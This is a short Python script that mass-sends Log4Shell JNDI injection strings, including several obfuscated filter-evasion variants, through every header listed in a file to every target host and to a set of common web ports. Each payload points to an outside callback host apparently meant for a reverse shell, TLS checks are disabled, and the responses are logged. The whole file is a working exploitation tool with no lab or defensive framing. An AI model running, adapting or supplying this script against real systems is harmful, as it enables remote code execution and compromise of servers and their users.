#!/usr/bin/python3

import json
import time
import urllib3

urllib3.disable_warnings()
https = urllib3.PoolManager(cert_reqs='CERT_NONE')

receiver = "revsh-backend"
logfile = "testlog.txt"
ports = [80, 443, 8005, 8009, 8080, 8081, 8443]
httptypes = ["http://", "https://"]
payloads = ["${jndi:ldap://{{receiver}}/payload-here",
	"${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{receiver}}/payload-here}",
	"${${::-j}ndi:rmi://{{receiver}}/payload-here}", "${jndi:rmi://{{receiver}}}",
	"${${lower:jndi}:${lower:rmi}://{{receiver}}/payload-here}",
	"${${lower:${lower:jndi}}:${lower:rmi}://{{receiver}}/payload-here}",
	"${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{receiver}}/payload-here}",
	"${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{receiver}}/payload-here}",
	"${jndi:dns://{{receiver}}/payload-here"]
globaldelay = 0.1


def gettargets():
	targets = []
	with open('targets.txt', 'r+') as targetfile:
		lines = targetfile.readlines()
		for target in lines:
			targets.append(target.replace('\n', ""))
	return targets


def getheaders():
	headers = []
	with open('headers.txt', 'r+') as headerfile:
		lines = headerfile.readlines()
		for line in lines:
			headers.append(line.replace('\n', ""))
	return headers


def getpostputheader(target, header):
	reqget = https.request("GET", target, headers=header)
	reqpost = https.request("POST", target, headers=header, body=json.dumps(header))
	reqput  = https.request("PUT", target, headers=header, body=json.dumps(header))
	time.sleep(globaldelay)
	return {"get": reqget.status, "post": reqpost.status, "put": reqput.status}


def appendtofile(thisline):
	with open(logfile, "a+") as log:
		log.write(str(thisline) + "\n")


#main here
headers = getheaders()
targets = gettargets()
for httptype in httptypes:
	for target in targets:
		for port in ports:
			deadcount = 0
			for header in headers:
				if deadcount >= 3:
					continue
				else:
					for payload in payloads:
						cleanpayload = payload.replace("{{receiver}}", receiver)
						cleanheader = {header: cleanpayload}
						webber = httptype + str(target) + ":" + str(port)
						try:
							thisout = {"target": webber, "payload": cleanheader, "responses": getpostputheader(webber, cleanheader)}
							print(thisout)
							appendtofile(thisout)
						except Exception as E:
							thisout = {"target": webber, "payload": cleanheader, "responses": "none"}
							print(thisout)
							appendtofile(thisout)
							deadcount += 1
